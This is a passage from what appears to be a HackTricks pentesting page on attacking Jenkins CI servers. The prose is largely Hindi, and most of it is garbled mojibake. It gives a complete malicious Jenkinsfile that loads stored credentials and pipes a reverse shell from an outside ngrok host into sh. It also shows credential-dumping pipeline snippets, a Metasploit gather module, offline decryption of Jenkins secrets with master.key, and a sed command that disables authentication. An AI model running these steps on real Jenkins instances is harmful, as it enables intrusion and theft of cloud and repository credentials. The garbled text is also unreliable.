рдпрджрд┐ рдЖрдк рдПрдХ **рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдВрд╕реНрдерд╛рди** рдХреЗ рд░реЗрдкреЛрдЬрд┐рдЯрд░реА рдХреА **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛** рдкрд░ **PR рдмрдирд╛рдиреЗ** рдФрд░ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ** рдХреА рдЙрдореНрдореАрдж рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП... рд▓реЗрдХрд┐рди рдпрджрд┐ рдпрд╣ **рдЦрд░рд╛рдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рддреЛ рдЖрдк рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдкрд╛рдЗрдкрд▓рд╛рдЗрди RCE

рдкрд┐рдЫрд▓реЗ RCE рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ [**рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](./#rce-creating-modifying-pipeline)ред

### Env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкреВрд░реА рдкрд╛рдЗрдкрд▓рд╛рдЗрди** рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдШреЛрд╖рд┐рдд рдХрд┐рдП рдЬрд╛рдПрдВред рдпреЗ env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╣рдореЗрд╢рд╛ **рд╕рднреА рдкрд╛рдЗрдкрд▓рд╛рдЗрди** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди/Jenkinsfiles рдХреА **рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░рдирд╛

Jenkins рджреНрд╡рд╛рд░рд╛ рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд╕рд╛рде рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдХреИрд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рджрд╛рддрд╛рдУрдВ** (`/credentials/`) рдпрд╛ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ** (`/job/<project-name>/configure`) рдХреЗ рд▓рд┐рдП **рд╕реНрдХреЛрдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рд╕рднреА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХрдо рд╕реЗ рдХрдо рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** рдЬреЛ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИрдВ рдФрд░ рдХрд╕реНрдЯрдо/рдЬрд╣рд░реАрд▓реЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдПрдХ рдФрд░ рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ **env** рдХреЗ рдЕрдВрджрд░ рдПрдХ **рд░рд╣рд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рд░рд╣рд╕реНрдп рдХрд╛ рдирд╛рдо рдФрд░ рдкреНрд░рдХрд╛рд░ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **`usernamePassword`** **рд░рд╣рд╕реНрдп** рдХреЛ **`string`** **рд░рд╣рд╕реНрдп** рдХреЗ рд░реВрдк рдореЗрдВ **рд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓реЗрдЧреА:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
рдпрд╣рд╛рдБ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЧреБрдкреНрдд рдкреНрд░рдХрд╛рд░ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
рдЗрд╕ рдкреГрд╖реНрда рдХреЗ рдЕрдВрдд рдореЗрдВ рдЖрдк **рд╕рднреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рдХрд╛рд░** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**рд╕рднреА рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдПрдХ рд╕рд╛рде рдбрдВрдк рдХрд░рдиреЗ** рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ **Jenkins** рдорд╢реАрди рдХреЛ **рд╕рдордЭреМрддрд╛** рдХрд░рдирд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рдмрд┐рд▓реНрдЯ-рдЗрди рдиреЛрдб** рдореЗрдВ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЪрд▓рд╛рдирд╛) рдФрд░ рдлрд┐рд░ **рдорд╛рд╕реНрдЯрд░ рдХреАрдЬрд╝** рдФрд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд░рд╣рд╕реНрдпреЛрдВ** рдХреЛ **рд▓реАрдХ** рдХрд░рдирд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдСрдлрд╝рд▓рд╛рдЗрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ред\
рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [Nodes & Agents section](./#nodes-and-agents) рдФрд░ [Post Exploitation section](./#post-exploitation) рдореЗрдВ рд╣реИред
{% endhint %}

### рдЯреНрд░рд┐рдЧрд░реНрд╕

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) рд╕реЗ: `triggers` рдирд┐рд░реНрджреЗрд╢ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рддрд░реАрдХреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдЙрди рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ GitHub рдпрд╛ BitBucket рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реИрдВ, `triggers` рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗрдмрд╣реБрдХ-рдЖрдзрд╛рд░рд┐рдд рдПрдХреАрдХрд░рдг рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдЯреНрд░рд┐рдЧрд░реНрд╕ рд╣реИрдВ `cron`, `pollSCM` рдФрд░ `upstream`ред

рдХреНрд░реЛрди рдЙрджрд╛рд╣рд░рдг:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **other examples in the docs**.

### Nodes & Agents

A **Jenkins instance** might have **different agents running in different machines**. From an attacker perspective, access to different machines means **different potential cloud credentials** to steal or **different network access** that could be abuse to exploit other machines.

For more information check the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

You can enumerate the **configured nodes** in `/computer/`, you will usually find the **`Built-In Node`** (which is the node running Jenkins) and potentially more:

![](<../../.gitbook/assets/image (249).png>)

It is **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ Built-In node рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдП** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ Jenkins рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред

To indicate you want to **run** the **pipeline** in the **built-in Jenkins node** you can specify inside the pipeline the following config:
```bash
pipeline {
agent {label 'built-in'}
```
### рдкреВрд░реНрдг рдЙрджрд╛рд╣рд░рдг

рдПрдХ рд╡рд┐рд╢реЗрд╖ рдПрдЬреЗрдВрдЯ рдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди, рдПрдХ рдХреНрд░реЙрди рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдФрд░ рд╕реНрдЯреЗрдЬ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЗ рд╕рд╛рде, рдПрдХ рдЪрд░рдг рдореЗрдВ 2 рдЪрд░ рд▓реЛрдб рдХрд░рдирд╛ рдФрд░ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬрдирд╛:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

### рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

рдЖрдк `/credentials/` рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ `credentials.xml` рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди **рдмрд┐рд▓реНрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ** рдореЗрдВ рднреА **рдЕрдзрд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рд╡рд╣рд╛рдБ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ (рд╕реАрдХреНрд░реЗрдЯреНрд╕)** рдХреЗ рдирд╛рдо рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдФрд░ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рдЕрдиреНрдп рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ **Jenkins рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**:

* secrets/master.key
* secrets/hudson.util.Secret

рдРрд╕реЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЖрдорддреМрд░ рдкрд░** рдореЗрдВ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рдПрдХ regex рд╣реИ:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдСрдлрд╝рд▓рд╛рдЗрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдиреЗ **рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╛рд╕рд╡рд░реНрдбреНрд╕** рдХреЛ рдбрдВрдк рдХрд┐рдпрд╛ рд╣реИ, рддреЛ **рдЙрди рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**ред
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy рд╕реЗ Jenkins рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### рдирдпрд╛ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ

1. `/var/lib/jenkins/config.xml` рдпрд╛ `C:\Program Files (x86)\Jenkis\` рдореЗрдВ Jenkins config.xml рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪреЗрдВред
2. `<useSecurity>true</useSecurity>` рд╢рдмреНрдж рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ рдФрд░ рд╢рдмреНрдж **`true`** рдХреЛ **`false`** рдореЗрдВ рдмрджрд▓реЗрдВред
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** рд╕рд░реНрд╡рд░ рдХреЛ **рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн** рдХрд░реЗрдВ: `service jenkins restart`
4. рдЕрдм рдлрд┐рд░ рд╕реЗ Jenkins рдкреЛрд░реНрдЯрд▓ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЗрд╕ рдмрд╛рд░ **Jenkins рдХреЛрдИ рдкреНрд░рдорд╛рдг рдкрддреНрд░ рдирд╣реАрдВ рдорд╛рдВрдЧреЗрдЧрд╛**ред рдЖрдк **рдкреНрд░рд╢рд╛рд╕рдХ рдкрд╛рд╕рд╡рд░реНрдб рдлрд┐рд░ рд╕реЗ рд╕реЗрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП "**Manage Jenkins**" рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред
5. рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ `<useSecurity>true</useSecurity>` рдореЗрдВ рдмрджрд▓рдХрд░ **рд╕реБрд░рдХреНрд╖рд╛** рдХреЛ рдлрд┐рд░ рд╕реЗ **рд╕рдХреНрд╖рдо** рдХрд░реЗрдВ рдФрд░ **Jenkins рдХреЛ рдлрд┐рд░ рд╕реЗ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн** рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдЬрд╛рдВрдЪреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
{% endhint %}
